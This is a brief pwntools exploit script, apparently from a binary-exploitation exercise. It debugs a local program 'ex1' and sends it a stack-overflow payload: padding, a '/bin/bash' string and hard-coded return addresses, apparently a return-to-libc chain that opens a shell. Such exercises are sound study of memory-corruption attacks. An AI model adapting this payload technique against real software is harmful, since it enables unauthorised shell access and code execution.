from pwn import *

context.arch = "amd64"
io = gdb.debug(
    "./bin/ex1",
    """
    break ex1.c:48
    continue
    """,
    terminal=["gnome-terminal", "--geometry=160x80", "-e"],
)
target = process("./bin/ex1")

bin_sh = b"/bin/bash\0" + b"A" * 54
# io.sendline("0")
# io.sendline(
#     arg
#     + bin_sh
#     + b"\0" * 64
#     + b"\0" * 2 * 64
#     + b"\0" * 16
#     + p64(0x7FFFFFFFD8FC)
#     + p64(0x7FFFF7EA3440)
#     + p64(0x7FFFF7EA3440)
#     + p64(0x7FFFF7EA3440)
#     + p64(0x7FFFF7E1A490)
# )
# io.interactive()
target.sendline("0")
target.sendline(
    b"A" * 64
    + bin_sh
    + b"A" * 64
    + b"A" * 2 * 64
    + b"A" * 16
    + p64(0x7FFFFFFFD8FC)
    + p64(0x7FFFF7EA3440)
    + p64(0x7FFFF7EA3440)
    + p64(0x7FFFF7EA3440)
    + p64(0x7FFFF7E1A490)
)
target.interactive()
